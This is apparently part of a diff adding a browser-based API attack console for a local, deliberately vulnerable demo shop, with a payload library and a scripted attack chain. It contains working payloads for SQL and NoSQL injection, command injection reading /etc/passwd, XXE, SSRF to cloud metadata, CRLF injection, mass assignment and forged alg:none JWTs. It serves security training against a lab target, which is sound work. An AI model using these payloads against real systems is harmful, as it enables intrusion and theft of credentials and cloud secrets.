+            <input class="url-input" id="url-input" value="http://localhost:5001/api/health" placeholder="http://localhost:5001/...">
+            <button class="send-btn" id="send-btn" onclick="sendRequest()">
+              Send →
+            </button>
+          </div>
+
+          <!-- Headers row -->
+          <div style="margin-top:.8rem;">
+            <div class="input-label">Custom Header (Key: Value)</div>
+            <input type="text" id="custom-header" placeholder="X-Custom-Header: value  (optional extra header)">
+          </div>
+
+          <!-- Body -->
+          <div id="body-area" style="display:none;margin-top:.8rem;">
+            <div class="input-label">Request Body (JSON or XML)</div>
+            <textarea id="body-input" placeholder='{"key": "value"}'></textarea>
+          </div>
+
+          <!-- Auth row -->
+          <div class="auth-row">
+            <div style="flex:1;">
+              <div class="input-label">Authorization Token</div>
+              <input type="text" id="auth-token" placeholder="Paste JWT here or click Auto-Login →">
+            </div>
+            <button class="auto-login-btn" onclick="autoLogin()">⚡ Auto-Login (admin/admin)</button>
+          </div>
+
+          <!-- Quick payloads -->
+          <div id="payload-section" style="display:none;margin-top:.9rem;">
+            <div class="input-label">⚡ Quick Attack Payloads — Click to inject</div>
+            <div class="payload-grid" id="payload-grid"></div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Response Panel -->
+      <div class="section-card">
+        <div class="card-header">
+          <span class="card-title">Response</span>
+          <div class="response-meta" id="resp-meta" style="display:none;">
+            <span class="status-pill" id="status-pill"></span>
+            <span class="time-badge" id="time-badge"></span>
+            <span class="size-badge" id="size-badge"></span>
+          </div>
+          <button class="copy-resp-btn" onclick="copyResp()" style="margin-left:auto;">📋 Copy</button>
+        </div>
+        <div class="card-body" style="padding-top:.5rem;">
+          <div class="resp-tabs">
+            <button class="resp-tab active" onclick="switchRespTab('body',this)">Body</button>
+            <button class="resp-tab" onclick="switchRespTab('headers',this)">Headers</button>
+            <button class="resp-tab" onclick="switchRespTab('raw',this)">Raw</button>
+          </div>
+          <div class="resp-body" id="resp-body-wrap">
+            <pre class="json-out" id="resp-body" style="color:var(--text3);">← Send a request to see the response</pre>
+          </div>
+          <div class="resp-body" id="resp-headers-wrap" style="display:none;">
+            <pre class="json-out" id="resp-headers" style="color:var(--text3);"></pre>
+          </div>
+          <div class="resp-body" id="resp-raw-wrap" style="display:none;">
+            <pre class="json-out" id="resp-raw" style="color:var(--text3);"></pre>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- HISTORY TAB -->
+    <div class="tab-content" id="tab-history">
+      <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:.8rem;">
+        <div style="font-size:.9rem;font-weight:600;color:var(--text);">Request History</div>
+        <button class="clear-hist-btn" onclick="clearHistory()">🗑 Clear All</button>
+      </div>
+      <div id="history-list">
+        <div style="color:var(--text3);font-size:.82rem;text-align:center;padding:2rem;">No requests yet. Start testing!</div>
+      </div>
+    </div>
+
+    <!-- OWASP MAP TAB -->
+    <div class="tab-content" id="tab-owasp">
+      <div style="font-size:.9rem;font-weight:600;color:var(--text);margin-bottom:1rem;">OWASP API Security Top 10 — 2023 Coverage</div>
+      <div class="owasp-grid" id="owasp-grid"></div>
+    </div>
+
+    <!-- JWT LAB TAB -->
+    <div class="tab-content" id="tab-jwt">
+      <div style="font-size:.9rem;font-weight:600;color:var(--text);margin-bottom:.5rem;">🔐 JWT Laboratory</div>
+      <div style="font-size:.78rem;color:var(--text3);margin-bottom:1rem;">Decode, forge and test JWT vulnerabilities. Login first to get a token.</div>
+
+      <div class="section-card">
+        <div class="card-header"><span class="card-title">Decode / Inspect Token</span></div>
+        <div class="card-body">
+          <textarea id="jwt-input" style="height:70px;" placeholder="Paste a JWT token here..." oninput="decodeJWT()"></textarea>
+          <div class="jwt-section" id="jwt-decoded" style="margin-top:.8rem;display:none;">
+            <div class="jwt-part header-part">
+              <div class="jwt-part-title">Header</div>
+              <pre class="jwt-pre" id="jwt-header"></pre>
+            </div>
+            <div class="jwt-part payload-part">
+              <div class="jwt-part-title">Payload</div>
+              <pre class="jwt-pre" id="jwt-payload"></pre>
+            </div>
+            <div class="jwt-part sig-part">
+              <div class="jwt-part-title">Signature</div>
+              <pre class="jwt-pre" id="jwt-sig"></pre>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <div class="section-card">
+        <div class="card-header"><span class="card-title">Attack Payloads</span></div>
+        <div class="card-body">
+          <div class="attack-chain" id="jwt-attacks"></div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ──────── RIGHT PANEL ──────── -->
+  <div class="rightpanel">
+
+    <!-- Token Manager -->
+    <div class="rp-section">
+      <div class="rp-title">🎫 Token Manager</div>
+      <div class="token-box empty" id="token-display" onclick="copyToken()" title="Click to copy">No token — click Auto-Login</div>
+      <div class="token-actions">
+        <div class="t-btn" onclick="autoLogin()">⚡ Login</div>
+        <div class="t-btn" onclick="useInRequest()">→ Use</div>
+        <div class="t-btn danger" onclick="clearToken()">✕ Clear</div>
+      </div>
+      <div style="margin-top:.6rem;">
+        <div class="input-label">Manual Token</div>
+        <input type="text" id="manual-token" placeholder="eyJ..." oninput="setManualToken()">
+      </div>
+    </div>
+
+    <!-- Attack Chain -->
+    <div class="rp-section">
+      <div class="rp-title">⛓ Attack Chain</div>
+      <div class="attack-chain">
+        <div class="chain-step" onclick="runChain(1)">
+          <div class="chain-num">1</div>
+          <div class="chain-info">
+            <div class="chain-name">Register as Admin</div>
+            <div class="chain-desc">Mass assignment → role:admin</div>
+          </div>
+          <button class="chain-btn" onclick="runChain(1);event.stopPropagation()">Run</button>
+        </div>
+        <div class="chain-step" onclick="runChain(2)">
+          <div class="chain-num">2</div>
+          <div class="chain-info">
+            <div class="chain-name">Login + Get Token</div>
+            <div class="chain-desc">Weak creds / NoSQL bypass</div>
+          </div>
+          <button class="chain-btn" onclick="runChain(2);event.stopPropagation()">Run</button>
+        </div>
+        <div class="chain-step" onclick="runChain(3)">
+          <div class="chain-num">3</div>
+          <div class="chain-info">
+            <div class="chain-name">Dump All Users</div>
+            <div class="chain-desc">BFLA → /api/admin/users</div>
+          </div>
+          <button class="chain-btn" onclick="runChain(3);event.stopPropagation()">Run</button>
+        </div>
+        <div class="chain-step" onclick="runChain(4)">
+          <div class="chain-num">4</div>
+          <div class="chain-info">
+            <div class="chain-name">Steal JWT Secret</div>
+            <div class="chain-desc">Config leak → forge tokens</div>
+          </div>
+          <button class="chain-btn" onclick="runChain(4);event.stopPropagation()">Run</button>
+        </div>
+        <div class="chain-step" onclick="runChain(5)">
+          <div class="chain-num">5</div>
+          <div class="chain-info">
+            <div class="chain-name">SSRF → Cloud Metadata</div>
+            <div class="chain-desc">/api/fetch → 169.254.x.x</div>
+          </div>
+          <button class="chain-btn" onclick="runChain(5);event.stopPropagation()">Run</button>
+        </div>
+      </div>
+    </div>
+
+    <!-- Confirmed Vulnerabilities -->
+    <div class="rp-section" style="flex:1;">
+      <div class="rp-title">✅ Confirmed Vulnerabilities</div>
+      <div id="confirmed-list" style="font-size:.75rem;color:var(--text3);">None confirmed yet.</div>
+    </div>
+
+  </div>
+</div>
+
+<script>
+// ─── State ───────────────────────────────────────────────────────────────────
+const BASE = 'http://localhost:5001';
+let currentToken = '';
+let reqHistory = [];
+let confirmedVulns = [];
+let respHeadersRaw = {};
+let lastRespRaw = '';
+let testedOWASP = new Set();
+let counts = { critical: 0, high: 0, reqs: 0, vulns: 0 };
+
+// ─── OWASP data ───────────────────────────────────────────────────────────────
+const OWASP = [
+  {id:'API1',name:'Broken Object Level Authorization',desc:'IDOR/BOLA — no ownership checks on objects.',sev:'critical'},
+  {id:'API2',name:'Broken Authentication',desc:'Weak creds, JWT alg:none, NoSQL bypass.',sev:'critical'},
+  {id:'API3',name:'Broken Object Property Auth',desc:'Mass assignment, SQLi, XXE, CMDi.',sev:'critical'},
+  {id:'API4',name:'Unrestricted Resource Consumption',desc:'No rate limiting on login/coupon.',sev:'medium'},
+  {id:'API5',name:'Broken Function Level Authorization',desc:'Any user can call admin endpoints.',sev:'critical'},
+  {id:'API6',name:'Unrestricted Access to Sensitive Business Flows',desc:'Negative amounts on orders.',sev:'high'},
+  {id:'API7',name:'Server Side Request Forgery',desc:'Fetch any URL including internal.',sev:'critical'},
+  {id:'API8',name:'Security Misconfiguration',desc:'CORS wildcard, missing headers, TRACE.',sev:'medium'},
+  {id:'API9',name:'Improper Inventory Management',desc:'Swagger, .env, GraphQL introspection.',sev:'medium'},
+  {id:'API10',name:'Unsafe Consumption of APIs',desc:'Trusts external API data blindly.',sev:'low'},
+];
+
+// ─── Payloads per endpoint ────────────────────────────────────────────────────
+const PAYLOADS = {
+  '/api/login': [
+    {label:"NoSQL bypass",value:'{"username":{"$gt":""},"password":{"$gt":""}}',t:'danger'},
+    {label:"admin/admin",value:'{"username":"admin","password":"admin"}'},
+    {label:"admin/password",value:'{"username":"admin","password":"password"}'},
+    {label:"alice/alice123",value:'{"username":"alice","password":"alice123"}'},
+  ],
+  '/api/register': [
+    {label:"role:admin",value:'{"username":"pwned","email":"p@x.com","password":"x","role":"admin","isAdmin":true,"balance":999999}',t:'danger'},
+    {label:"verified:true",value:'{"username":"vip","email":"v@x.com","password":"x","verified":true,"permissions":["admin","delete"]}',t:'danger'},
+  ],
+  '/api/products?search=': [
+    {label:"' OR '1'='1",value:"/api/products?search=' OR '1'='1",t:'danger',url:true},
+    {label:"UNION SELECT",value:"/api/products?search=a' UNION SELECT 1,2,3--",t:'danger',url:true},
+    {label:"SLEEP(4)",value:"/api/products?search=a';SLEEP(4)--",t:'danger',url:true},
+    {label:"Boolean blind",value:"/api/products?search=a' AND 1=1--",url:true},
+  ],
+  '/api/fetch?url=': [
+    {label:"AWS metadata",value:"/api/fetch?url=http://169.254.169.254/latest/meta-data/",t:'danger',url:true},
+    {label:"localhost:6379",value:"/api/fetch?url=http://localhost:6379/",url:true},
+    {label:"Internal :5001",value:"/api/fetch?url=http://127.0.0.1:5001/api/admin/config",t:'danger',url:true},
+    {label:"File:///etc/passwd",value:"/api/fetch?url=file:///etc/passwd",t:'danger',url:true},
+  ],
+  '/api/ping?host=': [
+    {label:";id",value:"/api/ping?host=localhost;id",t:'danger',url:true},
+    {label:"| cat /etc/passwd",value:"/api/ping?host=localhost|cat /etc/passwd",t:'danger',url:true},
+    {label:";ls -la",value:"/api/ping?host=localhost;ls%20-la",url:true},
+  ],
+  '/api/import': [
+    {label:"XXE /etc/passwd",value:'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><data>&xxe;</data>',t:'danger'},
+    {label:"XXE SSRF",value:'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><data>&xxe;</data>',t:'danger'},
+  ],
+  '/api/redirect': [
+    {label:"CRLF inject",value:"/api/redirect?url=https://x.com%0d%0aSet-Cookie:+admin=true",t:'danger',url:true},
+    {label:"Header split",value:"/api/redirect?url=https://x.com%0d%0aX-Injected:+CyberHawk",t:'danger',url:true},
+  ],
+  '/api/coupon': [
+    {label:"SAVE50",value:'{"code":"SAVE50"}'},
+    {label:"VIP100",value:'{"code":"VIP100"}'},
+  ],
+};
+
+// ─── JWT ─────────────────────────────────────────────────────────────────────
+const JWT_ATTACKS = [
+  {name:'alg:none bypass',desc:'Remove signature, set alg to none. Server may accept!',
+   fn:()=>forgeJWT({alg:'none'},{sub:'1',role:'admin',exp:9999999999},'')},
+  {name:'Weak secret (admin→admin role)',desc:'Sign with guessed secret "secret".',
+   fn:()=>makeWeakJWT(1,'admin')},
+  {name:'Role escalation',desc:'Change role to admin in payload.',
+   fn:()=>makeWeakJWT(2,'admin')},
+];
+
+function b64url(obj){return btoa(JSON.stringify(obj)).replace(/=/g,'').replace(/\+/g,'-').replace(/\//g,'_');}
+function forgeJWT(hdr,pay,sig){return b64url(hdr)+'.'+b64url(pay)+(sig?'.'+sig:'.');}
+function makeWeakJWT(uid,role){
+  return b64url({alg:'HS256',typ:'JWT'})+'.'+b64url({sub:String(uid),role,exp:9999999999})+'.FAKESIG';
+}
+
+// ─── JSON syntax highlighter ──────────────────────────────────────────────────
+function highlight(json){
+  if(typeof json!=='string') json=JSON.stringify(json,null,2);
+  return json
+    .replace(/("(\\u[a-zA-Z0-9]{4}|\\[^u]|[^\\"])*"(\s*:)?|\b(true|false|null)\b|-?\d+(?:\.\d*)?(?:[eE][+\-]?\d+)?)/g,m=>{
+      let cls='json-num';
+      if(/^"/.test(m)){cls=/:$/.test(m)?'json-key':'json-str';}
+      else if(/true|false/.test(m)){cls='json-bool';}
+      else if(/null/.test(m)){cls='json-null';}
+      return `<span class="${cls}">${m}</span>`;
+    });
+}
+
+// ─── Server status ────────────────────────────────────────────────────────────
+async function checkServer(){
+  const dot=document.getElementById('srv-dot');
+  const lbl=document.getElementById('srv-label');
+  try{
+    const r=await fetch(BASE+'/api/health',{mode:'cors',signal:AbortSignal.timeout(3000)});
+    if(r.ok){dot.className='status-dot online';lbl.textContent='Online :5001';}
+    else{dot.className='status-dot offline';lbl.textContent='Error '+r.status;}
+  }catch{dot.className='status-dot offline';lbl.textContent='Offline';}
+}
+checkServer();
+setInterval(checkServer,15000);
+
+// ─── Tab switching ────────────────────────────────────────────────────────────
+function switchTab(name,btn){
+  document.querySelectorAll('.tab-btn').forEach(b=>b.classList.remove('active'));
+  document.querySelectorAll('.tab-content').forEach(t=>t.classList.remove('active'));
+  btn.classList.add('active');
+  document.getElementById('tab-'+name).classList.add('active');
+  if(name==='owasp') renderOWSAP();
+  if(name==='jwt') renderJWTAttacks();
+}
+
+function switchRespTab(name,btn){
+  document.querySelectorAll('.resp-tab').forEach(b=>b.classList.remove('active'));
+  btn.classList.add('active');
+  document.getElementById('resp-body-wrap').style.display=name==='body'?'':'none';
+  document.getElementById('resp-headers-wrap').style.display=name==='headers'?'':'none';
+  document.getElementById('resp-raw-wrap').style.display=name==='raw'?'':'none';
+}
+
+// ─── Load endpoint ────────────────────────────────────────────────────────────
+function loadEp(el,method,path,body,vulnTitle,vulnDesc,sev,owaspId){
+  document.querySelectorAll('.ep-btn').forEach(b=>b.classList.remove('active'));
+  el.classList.add('active');
+
+  const urlPath = path.startsWith('http')? path : BASE+path;
+
+  document.getElementById('method-sel').value=method;
+  document.getElementById('url-input').value=urlPath;
+  document.getElementById('body-input').value=body||'';
+  document.getElementById('req-badge').textContent=method;
+  document.getElementById('req-badge').className='method-badge '+method;
+  const bodyArea=document.getElementById('body-area');
+  bodyArea.style.display=['POST','PUT','PATCH'].includes(method)?'block':'none';
+  if(method==='POST'&&path==='/api/import') bodyArea.style.display='block';
+
+  // Vuln banner
+  const banner=document.getElementById('vuln-banner');
+  banner.className='vuln-banner '+(sev||'info');
+  const icons={critical:'💀',high:'⚠️',medium:'🔶',low:'🔵',info:'ℹ️'};
+  banner.innerHTML=`
+    <div class="vuln-icon">${icons[sev]||'⚠️'}</div>
+    <div class="vuln-detail">
+      <div class="vuln-title">${vulnTitle||path}</div>
+      <div class="vuln-desc">${vulnDesc||''}</div>
+      ${owaspId?`<span class="vuln-owasp">${owaspId} — ${(OWASP.find(o=>o.id===owaspId)||{name:''}).name}</span>`:''}
+    </div>`;
+
+  // Payloads
+  const key=Object.keys(PAYLOADS).find(k=>path.startsWith(k)||path===k);
+  const pg=document.getElementById('payload-grid');
+  const ps=document.getElementById('payload-section');
+  if(key&&PAYLOADS[key].length){
+    pg.innerHTML=PAYLOADS[key].map(p=>`
+      <span class="payload-chip ${p.t||''}" onclick="injectPayload(${JSON.stringify(p.url?p.value:(p.value))},${!!p.url})">${p.label}</span>
+    `).join('');
+    ps.style.display='block';
+  }else{ps.style.display='none';}
+
+  document.getElementById('detection-alert').style.display='none';
+}
+
+function injectPayload(val,isUrl){
+  if(isUrl){document.getElementById('url-input').value=BASE+val;}
+  else{document.getElementById('body-input').value=val;}
+}
+
+function onMethodChange(){
+  const m=document.getElementById('method-sel').value;
+  document.getElementById('body-area').style.display=['POST','PUT','PATCH'].includes(m)?'block':'none';
+  document.getElementById('req-badge').textContent=m;
+  document.getElementById('req-badge').className='method-badge '+m;
+}
+
+// ─── Send Request ─────────────────────────────────────────────────────────────
+async function sendRequest(){
+  const method=document.getElementById('method-sel').value;
+  const url=document.getElementById('url-input').value;
+  const body=document.getElementById('body-input').value;
+  const tok=document.getElementById('auth-token').value||currentToken;
+  const customH=document.getElementById('custom-header').value;
+
+  const btn=document.getElementById('send-btn');
+  const loading=document.getElementById('loading');
+  btn.disabled=true; loading.style.display='flex';
+  document.getElementById('detection-alert').style.display='none';
+  document.getElementById('resp-meta').style.display='none';
+
+  const t0=Date.now();
+  try{
+    const headers={'Content-Type':'application/json'};
+    if(tok) headers['Authorization']=tok.startsWith('Bearer ')?tok:'Bearer '+tok;
+    if(customH&&customH.includes(':')){const [k,...vs]=customH.split(':');headers[k.trim()]=vs.join(':').trim();}
+
+    const opts={method,headers,mode:'cors'};
+    const isXML=body.trim().startsWith('<?xml');
+    if(isXML) headers['Content-Type']='application/xml';
+    if(['POST','PUT','PATCH'].includes(method)&&body) opts.body=body;
+
+    const resp=await fetch(url,opts);
+    const elapsed=Date.now()-t0;
+    let text='';
+    try{text=await resp.text();}catch{text='(empty)';}
+    lastRespRaw=text;
+    respHeadersRaw={};
+    resp.headers.forEach((v,k)=>{respHeadersRaw[k]=v;});
+
+    let parsed=null;
+    try{parsed=JSON.parse(text);}catch{}
+
+    // Render body
+    const bodyEl=document.getElementById('resp-body');
+    if(parsed!==null){bodyEl.innerHTML=highlight(JSON.stringify(parsed,null,2));}
+    else{bodyEl.textContent=text;}
+
+    // Headers tab
+    document.getElementById('resp-headers').innerHTML=highlight(JSON.stringify(respHeadersRaw,null,2));
+    // Raw tab
+    document.getElementById('resp-raw').textContent=text;
+
+    const pill=document.getElementById('status-pill');
+    pill.textContent=resp.status+' '+resp.statusText;
+    pill.className='status-pill '+(resp.status<300?'s-2xx':resp.status<500?'s-4xx':'s-5xx');
+    document.getElementById('time-badge').textContent=elapsed+'ms';
+    document.getElementById('size-badge').textContent=text.length+' bytes';
+    document.getElementById('resp-meta').style.display='flex';
+
+    counts.reqs++;
+    updateStats();
+
+    // Add to history
+    const urlObj=new URL(url);
+    addHistory(method,urlObj.pathname+urlObj.search,resp.status,elapsed,url,body,text,tok);
+
+    // Detection
+    detectVuln(resp.status,text,parsed,url,method);
+
+    // Track OWASP
+    const banner=document.getElementById('vuln-banner');
+    const owaspEl=banner.querySelector('.vuln-owasp');
+    if(owaspEl) testedOWASP.add(owaspEl.textContent.split('—')[0].trim());
+
+  }catch(e){
+    document.getElementById('resp-body').textContent='Error: '+e.message+'\n\nMake sure VulnShop is running:\n  cd demo_target\n  python vulnshop_api.py';
+    respHeadersRaw={};
+    lastRespRaw='Error: '+e.message;
+  }
+  btn.disabled=false; loading.style.display='none';
+}
+
+// ─── Detect Vulnerability ─────────────────────────────────────────────────────
+function detectVuln(status,text,parsed,url,method){
+  let detected=null;
+  const u=url.toLowerCase();
+
+  if(status>=500&&text.includes('SQL')){detected='💉 SQL Injection Confirmed — Server returned SQL error with query details leaked';}
+  else if(parsed&&parsed.vulnerable===true){detected='💀 Command Injection Confirmed — Server executed injected OS command';}
+  else if(parsed&&parsed.note&&parsed.note.includes('XXE')){detected='📄 XXE Confirmed — External entity injection read server file';}
+  else if(status===200&&parsed&&parsed.users&&parsed.users[0]&&parsed.users[0].password){detected='🔑 BFLA Confirmed — Admin endpoint returned ALL users with plaintext passwords!';}
+  else if(status===200&&parsed&&parsed.jwt_secret){detected='🔑 Config Leak Confirmed — JWT secret and credentials exposed!';}
+  else if(status===200&&parsed&&parsed.token&&u.includes('login')){
+    currentToken=parsed.token;
+    document.getElementById('auth-token').value=parsed.token;
+    document.getElementById('token-display').textContent=parsed.token;
+    document.getElementById('token-display').classList.remove('empty');
+    detected='✅ Login Success — Token captured and stored automatically';
+  }
+  else if(status===201&&parsed&&(parsed.role==='admin'||parsed.isAdmin===true)){detected='💀 Mass Assignment Confirmed — Account created with admin role!';}
+  else if(status===200&&u.includes('/api/users/')&&parsed&&parsed.credit_card){detected='💳 IDOR Confirmed — Another user\'s credit card number exposed!';}
+  else if(status===200&&u.includes('fetch')&&parsed&&parsed.content&&(text.includes('ami-id')||text.includes('metadata'))){detected='☁️ SSRF Confirmed — Cloud metadata endpoint successfully fetched!';}
+  else if(status===500&&u.includes('import')&&parsed&&parsed.vulnerable){detected='📄 XXE Confirmed — File content returned via external entity!';}
+  else if(text.includes('.env')&&text.includes('SECRET')){detected='🔓 Environment File Exposed — Credentials and secrets in plaintext!';}
+
+  if(detected){
+    document.getElementById('detection-text').textContent=detected;
+    document.getElementById('detection-alert').style.display='flex';
+    counts.vulns++;
+    if(detected.startsWith('💀')||detected.startsWith('🔑')||detected.startsWith('☁️')||detected.startsWith('💳')||detected.startsWith('📄')){counts.critical++;}
+    else{counts.high++;}
+    updateStats();
+    addConfirmed(detected);
+  }
+}
+
+// ─── History ──────────────────────────────────────────────────────────────────
+function addHistory(method,path,status,elapsed,fullUrl,reqBody,respBody,tok){
+  reqHistory.unshift({method,path,status,elapsed,fullUrl,reqBody,respBody,tok,ts:new Date().toLocaleTimeString()});
+  renderHistory();
+}
+function renderHistory(){
+  const list=document.getElementById('history-list');
+  if(!reqHistory.length){list.innerHTML='<div style="color:var(--text3);font-size:.82rem;text-align:center;padding:2rem;">No requests yet.</div>';return;}
+  list.innerHTML=reqHistory.map((h,i)=>`
+    <div class="history-item" onclick="replayHistory(${i})">
+      <span class="hist-method method-badge ${h.method} GET">${h.method}</span>
+      <span class="hist-path">${h.path}</span>
+      <span class="hist-status ${h.status<300?'s-2xx':h.status<500?'s-4xx':'s-5xx'} status-pill">${h.status}</span>
+      <span class="hist-time">${h.elapsed}ms</span>
+      <span style="font-size:.65rem;color:var(--text3);">${h.ts}</span>
+    </div>`).join('');
+}
+function replayHistory(i){
+  const h=reqHistory[i];
+  document.getElementById('method-sel').value=h.method;
+  document.getElementById('url-input').value=h.fullUrl;
+  document.getElementById('body-input').value=h.reqBody||'';
+  document.getElementById('auth-token').value=h.tok||'';
+  document.getElementById('body-area').style.display=['POST','PUT','PATCH'].includes(h.method)?'block':'none';
+  document.getElementById('req-badge').textContent=h.method;
+  document.getElementById('req-badge').className='method-badge '+h.method;
+  switchTab('request',document.querySelector('.tab-btn'));
+  document.querySelector('.tab-btn').classList.add('active');
+}
+function clearHistory(){reqHistory=[];renderHistory();}
+
+// ─── Confirmed Vulns ──────────────────────────────────────────────────────────
+function addConfirmed(text){
+  confirmedVulns.push(text);
+  const el=document.getElementById('confirmed-list');
+  el.innerHTML=confirmedVulns.map(v=>`
+    <div style="background:rgba(239,68,68,.07);border:1px solid rgba(239,68,68,.15);border-radius:7px;padding:.5rem .7rem;margin-bottom:.4rem;font-size:.72rem;color:var(--text2);">
+      ${v}
+    </div>`).join('');
+}
+
+// ─── Stats ────────────────────────────────────────────────────────────────────
+function updateStats(){
+  document.getElementById('s-critical').textContent=counts.critical;
+  document.getElementById('s-high').textContent=counts.high;
+  document.getElementById('s-reqs').textContent=counts.reqs;
+  document.getElementById('s-vulns').textContent=counts.vulns;
+}
+
+// ─── OWASP Map ────────────────────────────────────────────────────────────────
+function renderOWSAP(){
+  const g=document.getElementById('owasp-grid');
+  g.innerHTML=OWASP.map(o=>`
+    <div class="owasp-card ${testedOWASP.has(o.id)?'tested':''}">
+      <div class="owasp-id">${o.id}</div>
+      <div class="owasp-name">${o.name}</div>
+      <div class="owasp-status">
+        <div class="${testedOWASP.has(o.id)?'dot-tested':'dot-untested'}"></div>
+        ${testedOWASP.has(o.id)?'Tested':'Not tested yet'}
+      </div>
+      <div style="font-size:.67rem;color:var(--text3);margin-top:.3rem;">${o.desc}</div>
+    </div>`).join('');
+}
+
+// ─── JWT Lab ──────────────────────────────────────────────────────────────────
+function decodeJWT(){
+  const tok=document.getElementById('jwt-input').value.trim();
+  const decoded=document.getElementById('jwt-decoded');
+  if(!tok||!tok.includes('.')){decoded.style.display='none';return;}
+  const parts=tok.split('.');
+  if(parts.length<2){decoded.style.display='none';return;}
+  const pad=s=>s+'='.repeat((4-s.length%4)%4);
+  try{
+    const h=JSON.parse(atob(pad(parts[0]).replace(/-/g,'+').replace(/_/g,'/')));
+    const p=JSON.parse(atob(pad(parts[1]).replace(/-/g,'+').replace(/_/g,'/')));
+    document.getElementById('jwt-header').innerHTML=highlight(JSON.stringify(h,null,2));
+    document.getElementById('jwt-payload').innerHTML=highlight(JSON.stringify(p,null,2));
+    document.getElementById('jwt-sig').textContent=parts[2]||'(empty — alg:none!)';
+    decoded.style.display='flex';
+  }catch{decoded.style.display='none';}
+}
+function renderJWTAttacks(){
+  const c=document.getElementById('jwt-attacks');
+  c.innerHTML=JWT_ATTACKS.map((a,i)=>`
+    <div class="chain-step" onclick="applyJWTAttack(${i})">
+      <div class="chain-num">${i+1}</div>
+      <div class="chain-info">
+        <div class="chain-name">${a.name}</div>
+        <div class="chain-desc">${a.desc}</div>
+      </div>
+      <button class="chain-btn" onclick="applyJWTAttack(${i});event.stopPropagation()">Forge</button>
+    </div>`).join('');
+}
+function applyJWTAttack(i){
+  const tok=JWT_ATTACKS[i].fn();
+  document.getElementById('jwt-input').value=tok;
+  currentToken=tok;
+  document.getElementById('auth-token').value=tok;
+  document.getElementById('token-display').textContent=tok;
+  document.getElementById('token-display').classList.remove('empty');
+  document.getElementById('manual-token').value=tok;
+  decodeJWT();
+}
+
+// ─── Token helpers ────────────────────────────────────────────────────────────
+async function autoLogin(){
+  try{
+    const r=await fetch(BASE+'/api/login',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({username:'admin',password:'admin'}),mode:'cors'});
+    const d=await r.json();
+    if(d.token){
+      currentToken=d.token;
+      document.getElementById('auth-token').value=d.token;
+      document.getElementById('token-display').textContent=d.token;
+      document.getElementById('token-display').classList.remove('empty');
+      document.getElementById('manual-token').value=d.token;
+      document.getElementById('detection-text').textContent='✅ Auto-Login success — token stored. Now try authenticated endpoints!';
+      document.getElementById('detection-alert').style.display='flex';
+    }
+  }catch{
+    document.getElementById('detection-text').textContent='⚠️ Cannot connect to VulnShop. Run: cd demo_target && python vulnshop_api.py';
+    document.getElementById('detection-alert').style.display='flex';
+  }
+}
+function clearToken(){
+  currentToken='';
+  document.getElementById('auth-token').value='';
+  document.getElementById('token-display').textContent='No token — click Auto-Login';
+  document.getElementById('token-display').classList.add('empty');
+  document.getElementById('manual-token').value='';
+}
+function useInRequest(){
+  if(currentToken) document.getElementById('auth-token').value=currentToken;
+}
+function copyToken(){
+  if(currentToken){navigator.clipboard.writeText(currentToken);}
+}
+function setManualToken(){
+  currentToken=document.getElementById('manual-token').value;
+  document.getElementById('auth-token').value=currentToken;
+  document.getElementById('token-display').textContent=currentToken||'No token';
+  currentToken?document.getElementById('token-display').classList.remove('empty'):document.getElementById('token-display').classList.add('empty');
+}
+
+// ─── Attack chains ────────────────────────────────────────────────────────────
+async function runChain(step){
+  switchTab('request',document.querySelectorAll('.tab-btn')[0]);
+  document.querySelectorAll('.tab-btn')[0].classList.add('active');
+  if(step===1){
+    document.getElementById('method-sel').value='POST';
+    document.getElementById('url-input').value=BASE+'/api/register';
+    document.getElementById('body-input').value='{\n  "username":"pwned_admin",\n  "email":"pwn@x.com",\n  "password":"x",\n  "role":"admin",\n  "isAdmin":true,\n  "balance":999999\n}';
+    document.getElementById('body-area').style.display='block';
+  }else if(step===2){await autoLogin();}
+  else if(step===3){
+    document.getElementById('method-sel').value='GET';
+    document.getElementById('url-input').value=BASE+'/api/admin/users';
+    document.getElementById('body-area').style.display='none';
+  }else if(step===4){
+    document.getElementById('method-sel').value='GET';
+    document.getElementById('url-input').value=BASE+'/api/admin/config';
+    document.getElementById('body-area').style.display='none';
+  }else if(step===5){
+    document.getElementById('method-sel').value='GET';
+    document.getElementById('url-input').value=BASE+'/api/fetch?url=http://169.254.169.254/latest/meta-data/';
+    document.getElementById('body-area').style.display='none';
+  }
+  if(step!==2) await sendRequest();
+}
+
+// ─── Misc ─────────────────────────────────────────────────────────────────────
+function copyCmd(){
+  navigator.clipboard.writeText(document.getElementById('scan-cmd').textContent);
+  const b=document.querySelector('.copy-cmd-btn');
+  b.textContent='✓ Copied!';setTimeout(()=>b.textContent='📋 Copy',1500);
+}
+function copyResp(){
+  navigator.clipboard.writeText(lastRespRaw);
+  const b=document.querySelector('.copy-resp-btn');
+  b.textContent='✓';setTimeout(()=>b.textContent='📋 Copy',1200);
+}
+
+// Init OWASP grid (on first load show it)
+renderOWSAP();
+renderJWTAttacks();
+</script>
+</body>
+</html>
